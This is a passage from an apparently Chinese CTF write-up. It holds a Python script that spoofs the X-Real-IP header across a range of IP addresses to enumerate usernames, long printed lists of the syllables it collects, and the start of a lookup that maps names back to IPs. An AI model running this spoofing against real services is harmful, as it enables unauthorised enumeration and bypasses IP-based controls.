class="string">&#x27;Bel&#x27;</span>, <span class="string">&#x27;Yui&#x27;</span>, <span class="string">&#x27;Wor&#x27;</span>, <span class="string">&#x27;Neb&#x27;</span>, <span class="string">&#x27;Tot&#x27;</span>, <span class="string">&#x27;Luv&#x27;</span>, <span class="string">&#x27;Yun&#x27;</span>, <span class="string">&#x27;Lil&#x27;</span>, <span class="string">&#x27;Doc&#x27;</span>, <span class="string">&#x27;Lai&#x27;</span>, <span class="string">&#x27;Hem&#x27;</span>, <span class="string">&#x27;Kew&#x27;</span>, <span class="string">&#x27;Lay&#x27;</span>, <span class="string">&#x27;Nik&#x27;</span>, <span class="string">&#x27;Gus&#x27;</span>, <span class="string">&#x27;Hoh&#x27;</span>, <span class="string">&#x27;Fix&#x27;</span>, <span class="string">&#x27;Cup&#x27;</span>, <span class="string">&#x27;Fer&#x27;</span>, <span class="string">&#x27;Deo&#x27;</span>, <span class="string">&#x27;Coy&#x27;</span>, <span class="string">&#x27;Jer&#x27;</span>, <span class="string">&#x27;Luc&#x27;</span>, <span class="string">&#x27;Gif&#x27;</span>, <span class="string">&#x27;Cou&#x27;</span>, <span class="string">&#x27;Dob&#x27;</span>, <span class="string">&#x27;Dow&#x27;</span>, <span class="string">&#x27;Hum&#x27;</span>, <span class="string">&#x27;Hom&#x27;</span>, <span class="string">&#x27;Nan&#x27;</span>, <span class="string">&#x27;Dot&#x27;</span>, <span class="string">&#x27;Den&#x27;</span>, <span class="string">&#x27;Yeh&#x27;</span>, <span class="string">&#x27;Ces&#x27;</span>, <span class="string">&#x27;Jak&#x27;</span>, <span class="string">&#x27;Nei&#x27;</span>, <span class="string">&#x27;Rag&#x27;</span>, <span class="string">&#x27;Dar&#x27;</span>, <span class="string">&#x27;Pun&#x27;</span>, <span class="string">&#x27;Dex&#x27;</span>, <span class="string">&#x27;Gee&#x27;</span>, <span class="string">&#x27;Nes&#x27;</span>, <span class="string">&#x27;Mit&#x27;</span>, <span class="string">&#x27;Fos&#x27;</span>, <span class="string">&#x27;Sed&#x27;</span>, <span class="string">&#x27;Pac&#x27;</span>, <span class="string">&#x27;Cic&#x27;</span>, <span class="string">&#x27;Toi&#x27;</span>, <span class="string">&#x27;Raz&#x27;</span>, <span class="string">&#x27;Tok&#x27;</span>, <span class="string">&#x27;Did&#x27;</span>, <span class="string">&#x27;Rik&#x27;</span>, <span class="string">&#x27;Hit&#x27;</span>, <span class="string">&#x27;Kam&#x27;</span>, <span class="string">&#x27;Hiv&#x27;</span>, <span class="string">&#x27;Jut&#x27;</span>, <span class="string">&#x27;Tee&#x27;</span>, <span class="string">&#x27;Pod&#x27;</span>, <span class="string">&#x27;Gir&#x27;</span>, <span class="string">&#x27;Sax&#x27;</span>, <span class="string">&#x27;Hat&#x27;</span>, <span class="string">&#x27;Dab&#x27;</span>, <span class="string">&#x27;Nai&#x27;</span>, <span class="string">&#x27;Jez&#x27;</span>, <span class="string">&#x27;Was&#x27;</span>, <span class="string">&#x27;Bon&#x27;</span>, <span class="string">&#x27;Kid&#x27;</span>, <span class="string">&#x27;Him&#x27;</span>, <span class="string">&#x27;Tia&#x27;</span>, <span class="string">&#x27;Bin&#x27;</span>, <span class="string">&#x27;Wep&#x27;</span>, <span class="string">&#x27;Dup&#x27;</span>, <span class="string">&#x27;Yue&#x27;</span>, <span class="string">&#x27;Maa&#x27;</span>, <span class="string">&#x27;Hao&#x27;</span>, <span class="string">&#x27;Suv&#x27;</span>, <span class="string">&#x27;Ken&#x27;</span>, <span class="string">&#x27;Mod&#x27;</span>, <span class="string">&#x27;Kan&#x27;</span>, <span class="string">&#x27;Moc&#x27;</span>, <span class="string">&#x27;Cow&#x27;</span>, <span class="string">&#x27;Sex&#x27;</span>, <span class="string">&#x27;Ben&#x27;</span>, <span class="string">&#x27;Deg&#x27;</span>, <span class="string">&#x27;Gaf&#x27;</span>, <span class="string">&#x27;Yaw&#x27;</span>, <span class="string">&#x27;Luk&#x27;</span>, <span class="string">&#x27;Faa&#x27;</span>, <span class="string">&#x27;Bow&#x27;</span>, <span class="string">&#x27;Ror&#x27;</span>, <span class="string">&#x27;Bee&#x27;</span>, <span class="string">&#x27;Cob&#x27;</span>, <span class="string">&#x27;Loy&#x27;</span>, <span class="string">&#x27;Row&#x27;</span>, <span class="string">&#x27;Det&#x27;</span>, <span class="string">&#x27;Nut&#x27;</span>, <span class="string">&#x27;Rah&#x27;</span>, <span class="string">&#x27;Coi&#x27;</span>, <span class="string">&#x27;Rap&#x27;</span>, <span class="string">&#x27;Def&#x27;</span>, <span class="string">&#x27;Hie&#x27;</span>, <span class="string">&#x27;Tic&#x27;</span>, <span class="string">&#x27;Wis&#x27;</span>, <span class="string">&#x27;Mew&#x27;</span>, <span class="string">&#x27;Dav&#x27;</span>, <span class="string">&#x27;Sir&#x27;</span>, <span class="string">&#x27;Zoe&#x27;</span>, <span class="string">&#x27;Zin&#x27;</span>, <span class="string">&#x27;Uac&#x27;</span>, <span class="string">&#x27;Rab&#x27;</span>, <span class="string">&#x27;Yen&#x27;</span>, <span class="string">&#x27;Sip&#x27;</span>, <span class="string">&#x27;Nip&#x27;</span>, <span class="string">&#x27;Bir&#x27;</span>, <span class="string">&#x27;Pak&#x27;</span>, <span class="string">&#x27;Kar&#x27;</span>, <span class="string">&#x27;Gen&#x27;</span>, <span class="string">&#x27;Kea&#x27;</span>, <span class="string">&#x27;Sor&#x27;</span>, <span class="string">&#x27;Lod&#x27;</span>, <span class="string">&#x27;Fas&#x27;</span>, <span class="string">&#x27;Sif&#x27;</span>, <span class="string">&#x27;Zag&#x27;</span>, <span class="string">&#x27;Rea&#x27;</span>, <span class="string">&#x27;Wed&#x27;</span>, <span class="string">&#x27;Vex&#x27;</span>, <span class="string">&#x27;Lem&#x27;</span>, <span class="string">&#x27;Sob&#x27;</span>, <span class="string">&#x27;Sue&#x27;</span>, <span class="string">&#x27;Lar&#x27;</span>, <span class="string">&#x27;Rav&#x27;</span>, <span class="string">&#x27;Sou&#x27;</span>, <span class="string">&#x27;Bev&#x27;</span>, <span class="string">&#x27;Kek&#x27;</span>, <span class="string">&#x27;Kol&#x27;</span>, <span class="string">&#x27;Rae&#x27;</span>, <span class="string">&#x27;Map&#x27;</span>, <span class="string">&#x27;Dah&#x27;</span>, <span class="string">&#x27;Pee&#x27;</span>, <span class="string">&#x27;Tam&#x27;</span>, <span class="string">&#x27;Loc&#x27;</span>, <span class="string">&#x27;Boc&#x27;</span>, </span><br><span class="line"><span class="string">&#x27;Coz&#x27;</span>, <span class="string">&#x27;Ful&#x27;</span>, <span class="string">&#x27;Paz&#x27;</span>, <span class="string">&#x27;Hop&#x27;</span>, <span class="string">&#x27;Bui&#x27;</span>, <span class="string">&#x27;Ref&#x27;</span>, <span class="string">&#x27;Coo&#x27;</span>, <span class="string">&#x27;Rez&#x27;</span>, <span class="string">&#x27;Seq&#x27;</span>, <span class="string">&#x27;Lou&#x27;</span>, <span class="string">&#x27;Hon&#x27;</span>, <span class="string">&#x27;Leo&#x27;</span>, <span class="string">&#x27;Bis&#x27;</span>, <span class="string">&#x27;Dia&#x27;</span>, <span class="string">&#x27;Hui&#x27;</span>, <span class="string">&#x27;Mai&#x27;</span>, <span class="string">&#x27;Pez&#x27;</span>, <span class="string">&#x27;Boy&#x27;</span>, <span class="string">&#x27;Rog&#x27;</span>, <span class="string">&#x27;Dac&#x27;</span>, <span class="string">&#x27;Tut&#x27;</span>, <span class="string">&#x27;Rut&#x27;</span>, <span class="string">&#x27;Cuz&#x27;</span>, <span class="string">&#x27;Now&#x27;</span>, <span class="string">&#x27;Nii&#x27;</span>, <span class="string">&#x27;Yas&#x27;</span>, <span class="string">&#x27;Doj&#x27;</span>, <span class="string">&#x27;Saw&#x27;</span>, <span class="string">&#x27;Bex&#x27;</span>, <span class="string">&#x27;Fom&#x27;</span>]</span><br><span class="line">fourth=[]</span><br><span class="line"><span class="keyword">while</span> current_ip <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">    headers = headers_template.copy()</span><br><span class="line">    headers[<span class="string">&#x27;X-Real-IP&#x27;</span>] = current_ip</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.get(url, headers=headers)</span><br><span class="line">        <span class="keyword">match</span> = pattern.search(response.text)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">            comb=<span class="keyword">match</span>.group(<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">if</span> comb[<span class="number">0</span>:<span class="number">3</span>] <span class="keyword">not</span> <span class="keyword">in</span> first <span class="keyword">and</span> comb[<span class="number">0</span>:<span class="number">3</span>] <span class="keyword">not</span> <span class="keyword">in</span> second <span class="keyword">and</span> comb[<span class="number">0</span>:<span class="number">3</span>] <span class="keyword">not</span> <span class="keyword">in</span> third <span class="keyword">and</span> comb[<span class="number">0</span>:<span class="number">3</span>] <span class="keyword">not</span> <span class="keyword">in</span> fourth:</span><br><span class="line">                fourth.append(comb[<span class="number">0</span>:<span class="number">3</span>])</span><br><span class="line">            <span class="keyword">elif</span> comb[<span class="number">3</span>:<span class="number">6</span>] <span class="keyword">not</span> <span class="keyword">in</span> first <span class="keyword">and</span> comb[<span class="number">3</span>:<span class="number">6</span>] <span class="keyword">not</span> <span class="keyword">in</span> second <span class="keyword">and</span> comb[<span class="number">3</span>:<span class="number">6</span>] <span class="keyword">not</span> <span class="keyword">in</span> third <span class="keyword">and</span> comb[<span class="number">3</span>:<span class="number">6</span>] <span class="keyword">not</span> <span class="keyword">in</span> fourth:</span><br><span class="line">                fourth.append(comb[<span class="number">3</span>:<span class="number">6</span>])</span><br><span class="line">            <span class="keyword">elif</span> comb[<span class="number">6</span>:<span class="number">9</span>] <span class="keyword">not</span> <span class="keyword">in</span> first <span class="keyword">and</span> comb[<span class="number">6</span>:<span class="number">9</span>] <span class="keyword">not</span> <span class="keyword">in</span> second <span class="keyword">and</span> comb[<span class="number">6</span>:<span class="number">9</span>] <span class="keyword">not</span> <span class="keyword">in</span> third <span class="keyword">and</span> comb[<span class="number">6</span>:<span class="number">9</span>] <span class="keyword">not</span> <span class="keyword">in</span> fourth:</span><br><span class="line">                fourth.append(comb[<span class="number">6</span>:<span class="number">9</span>])</span><br><span class="line">            <span class="keyword">elif</span> comb[<span class="number">9</span>:<span class="number">12</span>] <span class="keyword">not</span> <span class="keyword">in</span> first <span class="keyword">and</span> comb[<span class="number">9</span>:<span class="number">12</span>] <span class="keyword">not</span> <span class="keyword">in</span> second <span class="keyword">and</span> comb[<span class="number">9</span>:<span class="number">12</span>] <span class="keyword">not</span> <span class="keyword">in</span> third <span class="keyword">and</span> comb[<span class="number">9</span>:<span class="number">12</span>] <span class="keyword">not</span> <span class="keyword">in</span> fourth:</span><br><span class="line">                fourth.append(comb[<span class="number">9</span>:<span class="number">12</span>])</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Error occurred while processing IP <span class="subst">&#123;current_ip&#125;</span>: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">    next_ip = increment_ip(current_ip)</span><br><span class="line">    <span class="keyword">if</span> next_ip <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    current_ip = next_ip</span><br><span class="line"><span class="built_in">print</span>(fourth)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>得到最后这个部分的字典</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">&#x27;Puc&#x27;</span>, <span class="string">&#x27;Maz&#x27;</span>, <span class="string">&#x27;Doh&#x27;</span>, <span class="string">&#x27;Hun&#x27;</span>, <span class="string">&#x27;Cud&#x27;</span>, <span class="string">&#x27;Vit&#x27;</span>, <span class="string">&#x27;Wer&#x27;</span>, <span class="string">&#x27;Hag&#x27;</span>, <span class="string">&#x27;Din&#x27;</span>, <span class="string">&#x27;Feb&#x27;</span>, <span class="string">&#x27;Gui&#x27;</span>, <span class="string">&#x27;Rak&#x27;</span>, <span class="string">&#x27;Vac&#x27;</span>, <span class="string">&#x27;Kim&#x27;</span>, <span class="string">&#x27;Pol&#x27;</span>, <span class="string">&#x27;Som&#x27;</span>, <span class="string">&#x27;Saa&#x27;</span>, <span class="string">&#x27;Hac&#x27;</span>, <span class="string">&#x27;Xie&#x27;</span>, <span class="string">&#x27;Ses&#x27;</span>, <span class="string">&#x27;Van&#x27;</span>, <span class="string">&#x27;Nef&#x27;</span>, <span class="string">&#x27;Mia&#x27;</span>, <span class="string">&#x27;Tab&#x27;</span>, <span class="string">&#x27;Pid&#x27;</span>, <span class="string">&#x27;Ver&#x27;</span>, <span class="string">&#x27;Cay&#x27;</span>, <span class="string">&#x27;Jog&#x27;</span>, <span class="string">&#x27;Jar&#x27;</span>, <span class="string">&#x27;Lan&#x27;</span>, <span class="string">&#x27;Hex&#x27;</span>, <span class="string">&#x27;Soe&#x27;</span>, <span class="string">&#x27;Lid&#x27;</span>, <span class="string">&#x27;Fip&#x27;</span>, <span class="string">&#x27;Wet&#x27;</span>, <span class="string">&#x27;Ner&#x27;</span>, <span class="string">&#x27;Dey&#x27;</span>, <span class="string">&#x27;May&#x27;</span>, <span class="string">&#x27;Dua&#x27;</span>, <span class="string">&#x27;Dez&#x27;</span>, <span class="string">&#x27;Gut&#x27;</span>, <span class="string">&#x27;Sag&#x27;</span>, <span class="string">&#x27;Kor&#x27;</span>, <span class="string">&#x27;Yon&#x27;</span>, <span class="string">&#x27;Haa&#x27;</span>, <span class="string">&#x27;Par&#x27;</span>, <span class="string">&#x27;Fat&#x27;</span>, <span class="string">&#x27;Vel&#x27;</span>, <span class="string">&#x27;Yum&#x27;</span>, <span class="string">&#x27;Wac&#x27;</span>, <span class="string">&#x27;Poe&#x27;</span>, <span class="string">&#x27;Yes&#x27;</span>, <span class="string">&#x27;Rex&#x27;</span>, <span class="string">&#x27;Gop&#x27;</span>, <span class="string">&#x27;Cit&#x27;</span>, <span class="string">&#x27;Val&#x27;</span>, <span class="string">&#x27;Xix&#x27;</span>, <span class="string">&#x27;Bit&#x27;</span>, <span class="string">&#x27;Mig&#x27;</span>, <span class="string">&#x27;Mib&#x27;</span>, <span class="string">&#x27;Gaa&#x27;</span>, <span class="string">&#x27;Sat&#x27;</span>, <span class="string">&#x27;Mex&#x27;</span>, <span class="string">&#x27;Geo&#x27;</span>, <span class="string">&#x27;Doi&#x27;</span>, <span class="string">&#x27;Mou&#x27;</span>, <span class="string">&#x27;Dol&#x27;</span>, <span class="string">&#x27;Joy&#x27;</span>, <span class="string">&#x27;Caa&#x27;</span>, <span class="string">&#x27;Dix&#x27;</span>, <span class="string">&#x27;Nat&#x27;</span>, <span class="string">&#x27;Boj&#x27;</span>, <span class="string">&#x27;Mad&#x27;</span>, <span class="string">&#x27;Pew&#x27;</span>, <span class="string">&#x27;Nev&#x27;</span>, <span class="string">&#x27;Sas&#x27;</span>, <span class="string">&#x27;Rin&#x27;</span>, <span class="string">&#x27;Dal&#x27;</span>, <span class="string">&#x27;Joo&#x27;</span>, <span class="string">&#x27;Vii&#x27;</span>, <span class="string">&#x27;Tid&#x27;</span>, <span class="string">&#x27;Hap&#x27;</span>, <span class="string">&#x27;Sea&#x27;</span>, <span class="string">&#x27;Cae&#x27;</span>, <span class="string">&#x27;Cab&#x27;</span>, <span class="string">&#x27;Nea&#x27;</span>, <span class="string">&#x27;Wan&#x27;</span>, <span class="string">&#x27;Mem&#x27;</span>, <span class="string">&#x27;Nam&#x27;</span>, <span class="string">&#x27;Mao&#x27;</span>, <span class="string">&#x27;Pov&#x27;</span>, <span class="string">&#x27;Pio&#x27;</span>, <span class="string">&#x27;Bey&#x27;</span>, <span class="string">&#x27;Vas&#x27;</span>, <span class="string">&#x27;Jee&#x27;</span>, <span class="string">&#x27;Not&#x27;</span>, <span class="string">&#x27;Lat&#x27;</span>, <span class="string">&#x27;Sud&#x27;</span>, <span class="string">&#x27;Bog&#x27;</span>, <span class="string">&#x27;Hue&#x27;</span>, <span class="string">&#x27;Rio&#x27;</span>, <span class="string">&#x27;Got&#x27;</span>, <span class="string">&#x27;Liu&#x27;</span>, <span class="string">&#x27;Lax&#x27;</span>, <span class="string">&#x27;Fec&#x27;</span>, <span class="string">&#x27;Duc&#x27;</span>, <span class="string">&#x27;Rec&#x27;</span>, <span class="string">&#x27;Mas&#x27;</span>, <span class="string">&#x27;Cig&#x27;</span>, <span class="string">&#x27;Vox&#x27;</span>, <span class="string">&#x27;Rov&#x27;</span>, <span class="string">&#x27;Pow&#x27;</span>, <span class="string">&#x27;Sil&#x27;</span>, <span class="string">&#x27;Gac&#x27;</span>, <span class="string">&#x27;Pet&#x27;</span>, <span class="string">&#x27;Yay&#x27;</span>, <span class="string">&#x27;Sad&#x27;</span>, <span class="string">&#x27;Ram&#x27;</span>, <span class="string">&#x27;Box&#x27;</span>, <span class="string">&#x27;Wag&#x27;</span>, <span class="string">&#x27;Nin&#x27;</span>, <span class="string">&#x27;Lib&#x27;</span>, <span class="string">&#x27;Tou&#x27;</span>, <span class="string">&#x27;Dae&#x27;</span>, <span class="string">&#x27;Tau&#x27;</span>, <span class="string">&#x27;Teo&#x27;</span>, <span class="string">&#x27;Sod&#x27;</span>, <span class="string">&#x27;Hoy&#x27;</span>, <span class="string">&#x27;Tip&#x27;</span>, <span class="string">&#x27;Cer&#x27;</span>, <span class="string">&#x27;Wee&#x27;</span>, <span class="string">&#x27;Nov&#x27;</span>, <span class="string">&#x27;Keg&#x27;</span>, <span class="string">&#x27;Nit&#x27;</span>, <span class="string">&#x27;Wok&#x27;</span>, <span class="string">&#x27;Hin&#x27;</span>, <span class="string">&#x27;Tue&#x27;</span>, <span class="string">&#x27;Ron&#x27;</span>, <span class="string">&#x27;Roi&#x27;</span>, <span class="string">&#x27;Vos&#x27;</span>, <span class="string">&#x27;Sao&#x27;</span>, <span class="string">&#x27;Kia&#x27;</span>, <span class="string">&#x27;Tix&#x27;</span>, <span class="string">&#x27;Mip&#x27;</span>, <span class="string">&#x27;Cub&#x27;</span>, <span class="string">&#x27;Nah&#x27;</span>, <span class="string">&#x27;Hot&#x27;</span>, <span class="string">&#x27;Wic&#x27;</span>, <span class="string">&#x27;Yar&#x27;</span>, <span class="string">&#x27;Sic&#x27;</span>, <span class="string">&#x27;Sar&#x27;</span>, <span class="string">&#x27;Kok&#x27;</span>, <span class="string">&#x27;Fee&#x27;</span>, <span class="string">&#x27;Yuk&#x27;</span>, <span class="string">&#x27;Hoo&#x27;</span>, <span class="string">&#x27;Hei&#x27;</span>, <span class="string">&#x27;Dap&#x27;</span>, <span class="string">&#x27;Cen&#x27;</span>, <span class="string">&#x27;Las&#x27;</span>, <span class="string">&#x27;Guy&#x27;</span>, <span class="string">&#x27;Jon&#x27;</span>, <span class="string">&#x27;His&#x27;</span>, <span class="string">&#x27;Moo&#x27;</span>, <span class="string">&#x27;Roz&#x27;</span>, <span class="string">&#x27;Fac&#x27;</span>, <span class="string">&#x27;Fir&#x27;</span>, <span class="string">&#x27;Ham&#x27;</span>, <span class="string">&#x27;Rad&#x27;</span>, <span class="string">&#x27;Foi&#x27;</span>, <span class="string">&#x27;Sof&#x27;</span>, <span class="string">&#x27;Poo&#x27;</span>, <span class="string">&#x27;Toa&#x27;</span>, <span class="string">&#x27;Kos&#x27;</span>, <span class="string">&#x27;Sei&#x27;</span>, <span class="string">&#x27;Dof&#x27;</span>, <span class="string">&#x27;Get&#x27;</span>, <span class="string">&#x27;Bap&#x27;</span>, <span class="string">&#x27;Kes&#x27;</span>, <span class="string">&#x27;Die&#x27;</span>, <span class="string">&#x27;Dad&#x27;</span>, <span class="string">&#x27;Pea&#x27;</span>, <span class="string">&#x27;Nus&#x27;</span>, <span class="string">&#x27;Tit&#x27;</span>, <span class="string">&#x27;Ros&#x27;</span>, <span class="string">&#x27;Nay&#x27;</span>, <span class="string">&#x27;Moa&#x27;</span>, <span class="string">&#x27;Zen&#x27;</span>, <span class="string">&#x27;Mam&#x27;</span>, <span class="string">&#x27;Heb&#x27;</span>, <span class="string">&#x27;Fab&#x27;</span>, <span class="string">&#x27;Rib&#x27;</span>, <span class="string">&#x27;Cao&#x27;</span>, <span class="string">&#x27;Hey&#x27;</span>, <span class="string">&#x27;Wot&#x27;</span>, <span class="string">&#x27;Soo&#x27;</span>, <span class="string">&#x27;Kai&#x27;</span>, <span class="string">&#x27;Cem&#x27;</span>, <span class="string">&#x27;Rom&#x27;</span>, <span class="string">&#x27;Uaw&#x27;</span>, <span class="string">&#x27;Zed&#x27;</span>, <span class="string">&#x27;Noi&#x27;</span>, <span class="string">&#x27;Sab&#x27;</span>, <span class="string">&#x27;Tes&#x27;</span>, <span class="string">&#x27;Gob&#x27;</span>, <span class="string">&#x27;Jax&#x27;</span>, <span class="string">&#x27;Nob&#x27;</span>, <span class="string">&#x27;Bao&#x27;</span>, <span class="string">&#x27;Tos&#x27;</span>, <span class="string">&#x27;Tor&#x27;</span>, <span class="string">&#x27;Mep&#x27;</span>, <span class="string">&#x27;Pan&#x27;</span>, <span class="string">&#x27;Har&#x27;</span>, <span class="string">&#x27;Guv&#x27;</span>, <span class="string">&#x27;Foa&#x27;</span>, <span class="string">&#x27;Nih&#x27;</span>, <span class="string">&#x27;Cim&#x27;</span>, <span class="string">&#x27;Pig&#x27;</span>, <span class="string">&#x27;Jot&#x27;</span>, <span class="string">&#x27;Sop&#x27;</span>, <span class="string">&#x27;Duh&#x27;</span>, <span class="string">&#x27;Jia&#x27;</span>, <span class="string">&#x27;Nil&#x27;</span>, <span class="string">&#x27;Fib&#x27;</span>, <span class="string">&#x27;Kei&#x27;</span>, <span class="string">&#x27;Gad&#x27;</span>, <span class="string">&#x27;Toy&#x27;</span>, <span class="string">&#x27;Pim&#x27;</span>, <span class="string">&#x27;Gel&#x27;</span>, <span class="string">&#x27;Cet&#x27;</span>, <span class="string">&#x27;Hal&#x27;</span>, <span class="string">&#x27;Wen&#x27;</span>, <span class="string">&#x27;Yah&#x27;</span>, <span class="string">&#x27;Nup&#x27;</span>, <span class="string">&#x27;Jai&#x27;</span>, <span class="string">&#x27;Paw&#x27;</span>, <span class="string">&#x27;Pos&#x27;</span>, <span class="string">&#x27;Qed&#x27;</span>, <span class="string">&#x27;Tel&#x27;</span>, <span class="string">&#x27;Gay&#x27;</span>, <span class="string">&#x27;Liv&#x27;</span>, <span class="string">&#x27;Bus&#x27;</span>, <span class="string">&#x27;Fop&#x27;</span>, <span class="string">&#x27;Pia&#x27;</span>, <span class="string">&#x27;Miu&#x27;</span>, <span class="string">&#x27;Ked&#x27;</span>, <span class="string">&#x27;Fea&#x27;</span>, <span class="string">&#x27;Fob&#x27;</span>, <span class="string">&#x27;Sel&#x27;</span>, <span class="string">&#x27;Miz&#x27;</span>, <span class="string">&#x27;Lor&#x27;</span>, <span class="string">&#x27;Tay&#x27;</span>, <span class="string">&#x27;Pot&#x27;</span>, <span class="string">&#x27;Tac&#x27;</span>, <span class="string">&#x27;Wei&#x27;</span>, <span class="string">&#x27;Mug&#x27;</span>, <span class="string">&#x27;Dat&#x27;</span>, <span class="string">&#x27;Wal&#x27;</span>, <span class="string">&#x27;How&#x27;</span>, <span class="string">&#x27;Yow&#x27;</span>, <span class="string">&#x27;Pax&#x27;</span>]</span><br></pre></td></tr></table></figure><p>接下来就是简单的查表，根据用户名算ip了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ipaddress</span><br><span class="line">first=[<span class="string">&#x27;Nod&#x27;</span>, <span class="string">&#x27;Tap&#x27;</span>, <span class="string">&#x27;Liz&#x27;</span>, <span class="string">&#x27;Mel&#x27;</span>, <span class="string">&#x27;Fig&#x27;</span>, <span class="string">&#x27;Rif&#x27;</span>, <span class="string">&#x27;Rip&#x27;</span>, <span class="string">&#x27;Pud&#x27;</span>, <span class="string">&#x27;Foo&#x27;</span>, <span class="string">&#x27;Haw&#x27;</span>, <span class="string">&#x27;Wef&#x27;</span>, <span class="string">&#x27;Kel&#x27;</span>, <span class="string">&#x27;Gat&#x27;</span>, <span class="string">&#x27;Hod&#x27;</span>, <span class="string">&#x27;Mom&#x27;</span>, <span class="string">&#x27;Lin&#x27;</span>, <span class="string">&#x27;Fez&#x27;</span>, <span class="string">&#x27;Rua&#x27;</span>, <span class="string">&#x27;Fay&#x27;</span>, <span class="string">&#x27;Pat&#x27;</span>, <span class="string">&#x27;Ned&#x27;</span>, <span class="string">&#x27;Taz&#x27;</span>, <span class="string">&#x27;Sid&#x27;</span>, <span class="string">&#x27;Mic&#x27;</span>, <span class="string">&#x27;Nom&#x27;</span>, <span class="string">&#x27;Hab&#x27;</span>, <span class="string">&#x27;Rug&#x27;</span>, <span class="string">&#x27;Men&#x27;</span>, <span class="string">&#x27;Nok&#x27;</span>, <span class="string">&#x27;Fun&#x27;</span>, <span class="string">&#x27;Pox&#x27;</span>, <span class="string">&#x27;Red&#x27;</span>, <span class="string">&#x27;Jah&#x27;</span>, <span class="string">&#x27;Tet&#x27;</span>, <span class="string">&#x27;Hip&#x27;</span>, <span class="string">&#x27;Tem&#x27;</span>, <span class="string">&#x27;Bad&#x27;</span>, <span class="string">&#x27;Mir&#x27;</span>, <span class="string">&#x27;Taj&#x27;</span>, <span class="string">&#x27;Maf&#x27;</span>, <span class="string">&#x27;Rac&#x27;</span>, <span class="string">&#x27;Zia&#x27;</span>, <span class="string">&#x27;Hea&#x27;</span>, <span class="string">&#x27;Fis&#x27;</span>, <span class="string">&#x27;Dem&#x27;</span>, <span class="string">&#x27;Bim&#x27;</span>, <span class="string">&#x27;Gow&#x27;</span>, <span class="string">&#x27;Hub&#x27;</span>, <span class="string">&#x27;Job&#x27;</span>, <span class="string">&#x27;Nex&#x27;</span>, <span class="string">&#x27;Jas&#x27;</span>, <span class="string">&#x27;Lie&#x27;</span>, <span class="string">&#x27;Sim&#x27;</span>, <span class="string">&#x27;Poc&#x27;</span>, <span class="string">&#x27;Ran&#x27;</span>, <span class="string">&#x27;Voa&#x27;</span>, <span class="string">&#x27;Gig&#x27;</span>, <span class="string">&#x27;Jes&#x27;</span>, <span class="string">&#x27;Nie&#x27;</span>, <span class="string">&#x27;Lal&#x27;</span>, <span class="string">&#x27;Lek&#x27;</span>, <span class="string">&#x27;Pen&#x27;</span>, <span class="string">&#x27;Cos&#x27;</span>, <span class="string">&#x27;Col&#x27;</span>, <span class="string">&#x27;Nao&#x27;</span>, <span class="string">&#x27;Mop&#x27;</span>, <span class="string">&#x27;Bac&#x27;</span>, <span class="string">&#x27;Cis&#x27;</span>, <span class="string">&#x27;Mor&#x27;</span>, <span class="string">&#x27;Vim&#x27;</span>, <span class="string">&#x27;Ceo&#x27;</span>, <span class="string">&#x27;Gic&#x27;</span>, <span class="string">&#x27;Mii&#x27;</span>, <span class="string">&#x27;Dep&#x27;</span>, <span class="string">&#x27;Len&#x27;</span>, <span class="string">&#x27;Few&#x27;</span>, <span class="string">&#x27;Lob&#x27;</span>, <span class="string">&#x27;Lea&#x27;</span>, <span class="string">&#x27;Bec&#x27;</span>, <span class="string">&#x27;Mui&#x27;</span>, <span class="string">&#x27;Pec&#x27;</span>, <span class="string">&#x27;Mab&#x27;</span>, <span class="string">&#x27;Her&#x27;</span>, <span class="string">&#x27;Tas&#x27;</span>, <span class="string">&#x27;Tui&#x27;</span>, <span class="string">&#x27;Kun&#x27;</span>, <span class="string">&#x27;Vic&#x27;</span>, <span class="string">&#x27;Too&#x27;</span>, <span class="string">&#x27;Woe&#x27;</span>, <span class="string">&#x27;Uav&#x27;</span>, <span class="string">&#x27;Dam&#x27;</span>, <span class="string">&#x27;Jin&#x27;</span>, <span class="string">&#x27;Kaz&#x27;</span>, <span class="string">&#x27;Yew&#x27;</span>, <span class="string">&#x27;Cid&#x27;</span>, <span class="string">&#x27;Jaw&#x27;</span>, <span class="string">&#x27;Hay&#x27;</span>, <span class="string">&#x27;Gib&#x27;</span>, <span class="string">&#x27;Mis&#x27;</span>, <span class="string">&#x27;Til&#x27;</span>, <span class="string">&#x27;Six&#x27;</span>, <span class="string">&#x27;Bot&#x27;</span>, <span class="string">&#x27;Guo&#x27;</span>]</span><br><span class="line">second=[<span class="string">&#x27;Wim&#x27;</span>, <span class="string">&#x27;Het&#x27;</span>, <span class="string">&#x27;Fau&#x27;</span>, <span class="string">&#x27;Ria&#x27;</span>, <span class="string">&#x27;Dio&#x27;</span>, <span class="string">&#x27;God&#x27;</span>, <span class="string">&#x27;Man&#x27;</span>, <span class="string">&#x27;Lim&#x27;</span>, <span class="string">&#x27;Fap&#x27;</span>, <span class="string">&#x27;Bar&#x27;</span>, <span class="string">&#x27;Sot&#x27;</span>, <span class="string">&#x27;Uae&#x27;</span>, <span class="string">&#x27;Faq&#x27;</span>, <span class="string">&#x27;Gum&#x27;</span>, <span class="string">&#x27;Doe&#x27;</span>, <span class="string">&#x27;Kay&#x27;</span>, <span 